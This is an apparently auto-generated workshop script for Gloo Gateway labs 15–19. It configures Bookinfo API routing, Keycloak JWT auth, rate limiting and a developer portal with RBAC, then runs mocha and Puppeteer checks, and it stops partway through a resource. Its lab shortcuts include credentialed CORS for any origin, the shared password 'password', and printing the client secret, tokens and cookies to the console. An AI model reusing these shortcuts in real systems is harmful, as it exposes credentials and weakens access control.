echo "executing test dist/document/build/templates/steps/apps/bookinfo/deploy-bookinfo/tests/check-bookinfo.test.js.liquid from lab number 15"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
./scripts/register-domain.sh bookinfo.example.com ${PROXY_IP}
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: bookinfo
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https
  hostnames:
    - "bookinfo.example.com"
  rules:
    # If the request path starts with /api/bookinfo
    - matches:
      - path:
          type: PathPrefix
          value: /api/bookinfo
      # Delegate routing to bookinfo namespace
      backendRefs: 
        - name: '*'
          namespace: bookinfo
          group: gateway.networking.k8s.io
          kind: HTTPRoute
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: productpage-api-v1
  namespace: bookinfo
spec:
  rules:
    # If the request path starts with /api/bookinfo/v1
    - matches:
      - path:
          type: PathPrefix
          value: /api/bookinfo/v1
      # Route to the productpage service
      backendRefs:
        - name: productpage
          port: 9080
      # Rewrite the path
      filters:
        - type: URLRewrite
          urlRewrite:
            path:
              type: ReplacePrefixMatch
              replacePrefixMatch: /api/v1/products
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the API without authentication", () => {
  it('Checking text \'The Comedy of Errors\' in the response', () => helpersHttp.checkBody({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', body: 'The Comedy of Errors', match: true }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-no-auth.test.js.liquid from lab number 16"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 16"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: apis
  namespace: gloo-system
spec:
  configs:
    - oauth2:
        accessTokenValidation:
          jwt:
            remoteJwks:
              url: "${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/certs"
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption-apis
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: bookinfo
  options:
    # ExtAuth configuration
    extauth:
      configRef:
        name: apis
        namespace: gloo-system
    cors:
      allowCredentials: true
      allowHeaders:
      - "*"
      allowMethods:
      - GET
      allowOriginRegex:
      - ".*"
EOF
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API unauthorized", () => {
  it('Response code is 403', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', retCode: 403 }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-unauthorized.test.js.liquid from lab number 16"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 16"; exit 1; }
export USER1_TOKEN=$(curl -Ssm 10 --fail-with-body \
  -d "client_id=${KEYCLOAK_CLIENT}" \
  -d "client_secret=${KEYCLOAK_SECRET}" \
  -d "username=user1" \
  -d "password=password" \
  -d "grant_type=password" \
  "$KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token" |
  jq -r .access_token)

echo export KEYCLOAK_CLIENT=${KEYCLOAK_CLIENT}
echo export KEYCLOAK_SECRET=${KEYCLOAK_SECRET}
echo export KEYCLOAK_URL=${KEYCLOAK_URL}
echo export USER1_TOKEN=${USER1_TOKEN}
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API authorized", () => {
  it('Response code is 200', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], retCode: 200 }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-authorized.test.js.liquid from lab number 16"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 16"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: ratelimit.solo.io/v1alpha1
kind: RateLimitConfig
metadata:
  name: limit-apis
  namespace: gloo-system
spec:
  raw:
    setDescriptors:
      - simpleDescriptors:
          - key: userId
        rateLimit:
          requestsPerUnit: 5
          unit: MINUTE
    rateLimits:
      - setActions:
        - metadata:
            descriptorKey: userId
            metadataKey:
              key: envoy.filters.http.ext_authz
              path:
                - key: userId
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption-apis
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: bookinfo
  options:
    # ExtAuth configuration
    extauth:
      configRef:
        name: apis
        namespace: gloo-system
    cors:
      allowCredentials: true
      allowHeaders:
      - "*"
      allowMethods:
      - GET
      allowOriginRegex:
      - ".*"
    # Rate limit configuration
    rateLimitConfigs:
      refs:
      - name: limit-apis
        namespace: gloo-system
EOF
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API rate limited", () => {
  it('Response code is 429', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], retCode: 429 }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-rate-limited.test.js.liquid from lab number 16"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 16"; exit 1; }
kubectl --context ${CLUSTER1} -n bookinfo annotate service productpage gloo.solo.io/scrape-openapi-source=https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/swagger.yaml --overwrite
kubectl --context ${CLUSTER1} -n bookinfo annotate service productpage gloo.solo.io/scrape-openapi-pull-attempts="3" --overwrite
kubectl --context ${CLUSTER1} -n bookinfo annotate service productpage gloo.solo.io/scrape-openapi-retry-delay=5s --overwrite
kubectl --context ${CLUSTER1} -n bookinfo annotate service productpage gloo.solo.io/scrape-openapi-use-backoff="true" --overwrite
echo Waiting for APIDoc to be created...
timeout -v 5m bash -c "until [[ \$(kubectl --context ${CLUSTER1} -n bookinfo get apidoc productpage-service) ]]; do
  kubectl --context ${CLUSTER1} -n bookinfo rollout restart deploy productpage-v1
  kubectl --context ${CLUSTER1} -n bookinfo rollout status deploy productpage-v1
  sleep 1
done"
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("APIDoc has been created", () => {
    it('APIDoc is present', () => helpers.k8sObjectIsPresent({ context: process.env.CLUSTER1, namespace: "bookinfo", k8sType: "apidoc", k8sObj: "productpage-service" }));
});
EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-api/tests/apidoc-created.test.js.liquid from lab number 16"
timeout --signal=INT 5m mocha ./test.js --timeout 10000 --retries=300 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 16"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: ApiProduct
metadata:
  name: bookinfo-api
  namespace: bookinfo
spec:
  id: bookinfo
  displayName: BookInfo REST API
  customMetadata:
    imageURL: https://raw.githubusercontent.com/solo-io/workshops/master/images/bookinfo.jpg
  versions:
    - apiVersion: v1
      targetRefs:
      - group: gateway.networking.k8s.io
        kind: HTTPRoute
        name: productpage-api-v1
        namespace: bookinfo
      openapiMetadata:
        title: BookInfo REST API v1
        description: |
          # Bookinfo REST API v1 Documentation
          This is some extra information about the API
      customMetadata:
        lifecyclePhase: General Availability
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: Portal
metadata:
  name: portal
  namespace: gloo-system
spec:
  # APIs will be accessible to unauthenticated users
  visibility:
    public: true
  # List of API products to be included in the portal
  apiProducts:
    - namespace: bookinfo
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1beta1
kind: ReferenceGrant
metadata:
  name: allow-portal-to-access-apiproduct
  namespace: bookinfo
spec:
  # Allow the portal server to reference APIProducts in other namespaces
  from:
    - group: portal.gloo.solo.io
      kind: Portal
      namespace: gloo-system
  to:
    - group: portal.gloo.solo.io
      kind: ApiProduct
EOF
kubectl --context ${CLUSTER1} -n gloo-system delete ratelimitconfig limit-apis
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption-apis
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: bookinfo
  options:
    # ExtAuth configuration
    extauth:
      configRef:
        name: apis
        namespace: gloo-system
    cors:
      allowCredentials: true
      allowHeaders:
      - "*"
      allowMethods:
      - GET
      allowOriginRegex:
      - ".*"
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gloo.solo.io/v1
kind: Upstream
metadata:
  name: openlibrary
  namespace: bookinfo
spec:
  static:
    hosts:
      - addr: static.is.solo.io
        port: 443
  sslConfig: {}
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: ApiSchemaDiscovery
metadata:
  name: openlibrary
  namespace: bookinfo
spec:
  # Fetch the OpenAPI schema from the Open Library API
  openapi:
    fetchEndpoint:
      url: "https://raw.githubusercontent.com/internetarchive/openlibrary/refs/heads/master/static/openapi.json"
  servedBy:
  - targetRef:
      kind: UPSTREAM
      name: openlibrary
      namespace: bookinfo
    port: 443
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: productpage-api-v2
  namespace: bookinfo
  annotations:
    delegation.gateway.solo.io/inherit-parent-matcher: "true"
spec:
  rules:
    # If the request path starts with /v2/search.json
    # Rewrite to /search.json and route to the openlibrary upstream
    - matches:
      - path:
          type: PathPrefix
          value: /v2/search.json
      backendRefs:
        - group: gloo.solo.io
          kind: Upstream
          name: openlibrary
          port: 443
      filters:
        - type: URLRewrite
          urlRewrite:
            hostname: static.is.solo.io
            path:
              type: ReplacePrefixMatch
              replacePrefixMatch: /search.json
    # If the request path starts with /v2/authors/{author}.json
    # Apply regex rewrite and route to the openlibrary upstream
    - matches:
      - path:
          type: RegularExpression
          value: /v2/authors/([^.]+).json
      backendRefs:
        - group: gloo.solo.io
          kind: Upstream
          name: openlibrary
          port: 443
      filters:
        - type: URLRewrite
          urlRewrite:
            hostname: static.is.solo.io
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: regex-rewrite
    # If the request path starts with /v2
    # Rewrite to /api/v1/products and route to the productpage service
    - matches:
      - path:
          type: PathPrefix
          value: /v2
      backendRefs:
        - name: productpage
          port: 9080
      filters:
        - type: URLRewrite
          urlRewrite:
            path:
              type: ReplacePrefixMatch
              replacePrefixMatch: /api/v1/products
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: regex-rewrite
  namespace: bookinfo
spec:
  options:
    regexRewrite:
      # rewrite /api/bookinfo/v2/authors/{author}.json to /authors/{author}.json
      pattern:
        regex: /api/bookinfo/v2/authors/([^.]+).json
      substitution: /authors/\1.json
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the openlibrary API", () => {
  it('Checking text \'language\' in the response', () => helpersHttp.checkBody({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v2/search.json?title=The%20Comedy%20of%20Errors&fields=language&limit=1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], body: 'language', match: true }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-stitching/tests/access-openlibrary-api.test.js.liquid from lab number 17"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 17"; exit 1; }
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the openlibrary API with regex", () => {
  it('Checking text \'Rowling\' in the response', () => helpersHttp.checkBody({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v2/authors/OL23919A.json', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], body: 'Rowling', match: true }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-stitching/tests/access-openlibrary-api-regex.test.js.liquid from lab number 17"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 17"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: ApiProduct
metadata:
  name: bookinfo-api
  namespace: bookinfo
spec:
  id: bookinfo
  displayName: BookInfo REST API
  customMetadata:
    imageURL: https://raw.githubusercontent.com/solo-io/workshops/master/images/bookinfo.jpg
  versions:
    - apiVersion: v1
      targetRefs:
      - group: gateway.networking.k8s.io
        kind: HTTPRoute
        name: productpage-api-v1
        namespace: bookinfo
      openapiMetadata:
        title: BookInfo REST API v1
        description: |
          # Bookinfo REST API v1 Documentation
          This is some extra information about the API
      customMetadata:
        lifecyclePhase: Deprecated
    - apiVersion: v2
      targetRefs:
      - group: gateway.networking.k8s.io
        kind: HTTPRoute
        name: productpage-api-v2
        namespace: bookinfo
      openapiMetadata:
        title: BookInfo REST API v2
        description: |
          # Bookinfo REST API v1 Documentation
          You can find more information about the openlibrary API [here](https://openlibrary.org/developers/api)
      customMetadata:
        lifecyclePhase: General Availability
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: portal
  namespace: gloo-system
spec:
  configs:
    - oauth2:
        oidcAuthorizationCode:
          appUrl: "https://portal.example.com"
          callbackPath: /v1/login
          clientId: ${KEYCLOAK_CLIENT}
          clientSecretRef:
            name: oauth
            namespace: gloo-system
          issuerUrl: "${KEYCLOAK_URL}/realms/workshop/"
          logoutPath: /v1/logout
          session:
            failOnFetchFailure: true
            redis:
              cookieName: keycloak-session
              options:
                host: redis:6379
          scopes:
          - email
          headers:
            idTokenHeader: id_token
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption-portal-api
  namespace: gloo-system
spec:
  options:
    extauth:
      configRef:
        name: portal
        namespace: gloo-system
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: portal-server
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https
  hostnames:
    - "portal.example.com"
    - gateway-portal-web-server.gloo-system
  rules:
    - backendRefs:
        - name: gateway-portal-web-server
          port: 8080
      matches:
      - path:
          type: PathPrefix
          value: /v1
        headers:
        - name: Authorization
          type: RegularExpression
          value: Bearer\s.*
      filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: routeoption-apis
    - backendRefs:
        - name: gateway-portal-web-server
          port: 8080
      matches:
      - path:
          type: PathPrefix
          value: /v1
        headers:
          - name: Cookie
            type: RegularExpression
            value: ".*?keycloak-session=.*"
      filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: routeoption-portal-api
    - backendRefs:
        - name: gateway-portal-web-server
          port: 8080
      matches:
      - path:
          type: PathPrefix
          value: /v1
EOF
./scripts/register-domain.sh portal.example.com ${PROXY_IP}
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the portal API without authentication", () => {
  it('Checking text \'apiProductMetadata\' in the response', () => helpersHttp.checkBody({ host: `https://portal.example.com`, path: '/v1/api-products', body: 'apiProductMetadata', match: true }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-backend/tests/access-portal-api-no-auth.test.js.liquid from lab number 18"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: portal-frontend
  namespace: gloo-system
---
apiVersion: v1
kind: Service
metadata:
  name: portal-frontend
  namespace: gloo-system
  labels:
    app: portal-frontend
    service: portal-frontend
spec:
  ports:
  - name: http
    port: 4000
    targetPort: 4000
  selector:
    app: portal-frontend
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: portal-frontend
  namespace: gloo-system
spec:
  replicas: 1
  selector:
    matchLabels:
      app: portal-frontend
  template:
    metadata:
      labels:
        app: portal-frontend
    spec:
      serviceAccountName: portal-frontend
      containers:
      - image: gcr.io/solo-public/docs/portal-frontend:v0.1.1
        args: ["--host", "0.0.0.0"]
        imagePullPolicy: Always
        name: portal-frontend
        ports:
        - containerPort: 4000
        readinessProbe:
          httpGet:
            path: /login
            port: 4000
        env:
        - name: VITE_PORTAL_SERVER_URL
          value: "https://portal.example.com/v1"
        - name: VITE_APPLIED_OIDC_AUTH_CODE_CONFIG
          value: "true"
        - name: VITE_OIDC_AUTH_CODE_CONFIG_CALLBACK_PATH
          value: "/v1/login"
        - name: VITE_OIDC_AUTH_CODE_CONFIG_LOGOUT_PATH
          value: "/v1/logout"
EOF
kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy portal-frontend
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: portal-frontend
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https
  hostnames:
    - "portal.example.com"
    - gateway-portal-web-server.gloo-system
  rules:
    - backendRefs:
        - name: portal-frontend
          port: 4000
      matches:
      - path:
          type: PathPrefix
          value: /v1/login
      - path:
          type: PathPrefix
          value: /v1/logout
      filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: routeoption-portal-api
    - backendRefs:
        - name: portal-frontend
          port: 4000
      matches:
      - path:
          type: PathPrefix
          value: /
EOF
ATTEMPTS=1
timeout 120 bash -c 'while [[ "$(curl -m 2 --max-time 2 --insecure -s -o /dev/null -w ''%{http_code}'' https://portal.example.com/v1/login)" != "302" ]]; do sleep 5; done'
timeout 120 bash -c 'while [[ "$(curl -m 2 --max-time 2 --insecure -s -o /dev/null -w ''%{http_code}'' https://portal.example.com)" != "200" ]]; do sleep 5; done'
export USER1_COOKIE=$(node tests/keycloak-token.js "https://portal.example.com/v1/login" user1)
export USER2_COOKIE=$(node tests/keycloak-token.js "https://portal.example.com/v1/login" user2)
ATTEMPTS=1
until ([ ! -z "$USER2_COOKIE" ] && [[ $USER2_COOKIE != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 3
  export USER2_COOKIE=$(node tests/keycloak-token.js "https://portal.example.com/v1/login" user2)
done
ATTEMPTS=1
until ([ ! -z "$USER1_COOKIE" ] && [[ $USER1_COOKIE != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 3
  export USER1_COOKIE=$(node tests/keycloak-token.js "https://portal.example.com/v1/login" user1)
done
echo "User1 token: $USER1_COOKIE"
echo "User2 token: $USER2_COOKIE"

# The user must be created (in the database) in 1.18
curl -k -H "Cookie: ${USER1_COOKIE}" -X PUT "https://portal.example.com/v1/me"
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the portal frontend with authentication", () => {
  const cookieString = process.env.USER1_COOKIE;

  it('Checking text \'apiProductMetadata\' in the response', () => helpersHttp.checkBody({ host: `https://portal.example.com`, path: '/v1/api-products', headers: [{ key: 'Cookie', value: cookieString }], body: 'apiProductMetadata', match: true }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-api-auth.test.js.liquid from lab number 19"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 19"; exit 1; }
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Authentication is working properly", function() {
  const cookieString = process.env.USER1_COOKIE;

  it("The portal frontend isn't accessible without authenticating", () => {
    return helpersHttp.checkURL({ host: `https://portal.example.com`, path: '/v1/login', retCode: 302 });
  });

  it("The portal frontend is accessible after authenticating", () => {
    return helpersHttp.checkURL({ host: `https://portal.example.com`, path: '/v1/login', headers: [{ key: 'Cookie', value: cookieString }], retCode: 200 });
  });
});
EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-frontend-authenticated.test.js.liquid from lab number 19"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 19"; exit 1; }
cat <<'EOF' > ./test.js
const DeveloperPortalHomePage = require('./tests/pages/dev-portal/home-page');
const DeveloperPortalAPIPage = require('./tests/pages/dev-portal/api-page');
const KeycloakSignInPage = require('./tests/pages/keycloak-sign-in-page');
const puppeteer = require('puppeteer-extra');
puppeteer.use(require('puppeteer-extra-plugin-user-preferences')({
    userPrefs: {
        safebrowsing: {
            enabled: false,
            enhanced: false
        }
    }
}));
const { enhanceBrowser } = require('./tests/utils/enhance-browser');
var chai = require('chai');
var expect = chai.expect;

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 4000);
  } else {
    done();
  }
});

describe("Dev portal frontend UI", function () {
  // UI tests often require a longer timeout.
  // So here we force it to a minimum of 30 seconds.
  const currentTimeout = this.timeout();
  this.timeout(Math.max(currentTimeout, 30000));

  let browser;
  let devPortalHomePage;
  let devPortalAPIPage;
  let keycloakSignInPage;

  // Use Mocha's 'before' hook to set up Puppeteer
  before(async function () {
    browser = await puppeteer.launch({
      headless: "new",
      slowMo: 10,
      ignoreHTTPSErrors: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    });
    browser = enhanceBrowser(browser, this.currentTest.title);
    let page = await browser.newPage();
    await page.setViewport({ width: 1500, height: 1000 });
    devPortalHomePage = new DeveloperPortalHomePage(page);
    devPortalAPIPage = new DeveloperPortalAPIPage(page);
    keycloakSignInPage = new KeycloakSignInPage(page);
  });

  it("user1 should authenticate with keycloak", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user1");
  });

  it("user1 should see API Products", async () => {
    await devPortalAPIPage.navigateTo(`https://portal.example.com/apis`);
    const apiProducts = await devPortalAPIPage.getAPIProducts();
    expect(apiProducts.some(item => item.includes("BookInfo"))).to.be.true;
  });

  // Use Mocha's 'after' hook to close Puppeteer
  after(async function () {
    await browser.close();
  });
});

EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/dev-portal-ui-tests.test.js.liquid from lab number 19"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 19"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: PortalGroup
metadata:
  name: rbac
  namespace: gloo-system
spec:
  membership:
    - claimGroup:
        - key: subscription
          value: enterprise
  apiProducts:
    - name: "*"
      namespace: bookinfo
EOF
cat <<'EOF' > ./test.js
const DeveloperPortalHomePage = require('./tests/pages/dev-portal/home-page');
const DeveloperPortalAPIPage = require('./tests/pages/dev-portal/api-page');
const KeycloakSignInPage = require('./tests/pages/keycloak-sign-in-page');
const puppeteer = require('puppeteer-extra');
puppeteer.use(require('puppeteer-extra-plugin-user-preferences')({
    userPrefs: {
        safebrowsing: {
            enabled: false,
            enhanced: false
        }
    }
}));
const { enhanceBrowser } = require('./tests/utils/enhance-browser');
var chai = require('chai');
var expect = chai.expect;

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 4000);
  } else {
    done();
  }
});

describe("Dev portal frontend UI", function () {
  // UI tests often require a longer timeout.
  // So here we force it to a minimum of 30 seconds.
  const currentTimeout = this.timeout();
  this.timeout(Math.max(currentTimeout, 30000));

  let browser;
  let devPortalHomePage;
  let devPortalAPIPage;
  let keycloakSignInPage;

  // Use Mocha's 'before' hook to set up Puppeteer
  before(async function () {
    browser = await puppeteer.launch({
      headless: "new",
      slowMo: 10,
      ignoreHTTPSErrors: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    });
    browser = enhanceBrowser(browser, this.currentTest.title);
    let page = await browser.newPage();
    await page.setViewport({ width: 1500, height: 1000 });
    devPortalHomePage = new DeveloperPortalHomePage(page);
    devPortalAPIPage = new DeveloperPortalAPIPage(page);
    keycloakSignInPage = new KeycloakSignInPage(page);
  });

  it("user1 should authenticate with keycloak", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user1");
  });

  it("user1 should see API Products", async () => {
    await devPortalAPIPage.navigateTo(`https://portal.example.com/apis`);
    const apiProducts = await devPortalAPIPage.getAPIProducts();
    expect(apiProducts.some(item => item.includes("BookInfo"))).to.be.true;
  });

   it("logout and login as user2", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com/v1/logout`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user2", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user2");
  });

  it("user2 shouldn't see API Products", async () => {
    await devPortalAPIPage.navigateTo(`https://portal.example.com/apis`);
    const apiProducts = await devPortalAPIPage.getAPIProducts();
    expect(apiProducts).to.have.lengthOf(0);
  });

  // Use Mocha's 'after' hook to close Puppeteer
  after(async function () {
    await browser.close();
  });
});

EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/dev-portal-ui-tests-rbac.test.js.liquid from lab number 19"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 19"; exit 1; }
kubectl --context ${CLUSTER1} -n gloo-system delete portalgroups.portal.gloo.solo.io rbac
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: ApiDoc
metadata:
  name: world-cities
  namespace: world-cities
spec:
  openapi:
    inlineString: |-
$(cat data/steps/dev-portal-api-soap/openapi.yaml | sed 's/^/      /')
  servedBy:
  - targetRef:
      kind: Service
      name: world-cities-soap-service
      namespace: world-cities
    port: 8080
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: ApiProduct
metadata:
  name: world-cities
  namespace: world-cities
spec:
  id: world-cities
  displayName: World Cities API
  customMetadata:
    imageURL: https://upload.wikimedia.org/wikipedia/commons/thumb/6/67/London_Skyline_%28125508655%29.jpeg/1280px-London_Skyline_%28125508655%29.jpeg
  versions:
  - apiVersion: v1
    targetRefs:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      name: world-cities
      namespace: world-cities
    openapiMetadata:
      title: World Cities API
      description: |
        # World Cities REST API Documentation
        This API serves data from a public database [here](https://github.com/datasets/world-cities/blob/main/data/world-cities.csv).
    customMetadata:
      lifecyclePhase: General Availability
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: Portal
metadata:
  name: portal
  namespace: gloo-system
spec:
  # APIs will be accessible to unauthenticated users
  visibility:
    public: true
  # List of API products to be included in the portal
  apiProducts:
    - namespace: bookinfo
    - namespace: world-cities
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1beta1
kind: ReferenceGrant
metadata:
  name: allow-portal-to-access-apiproduct
  namespace: world-cities
spec:
  from:
  - group: portal.gloo.solo.io
    kind: Portal
    namespace: gloo-system
  to:
  - group: portal.gloo.solo.io
    kind: ApiProduct
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: world-cities
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: world-cities
  options:
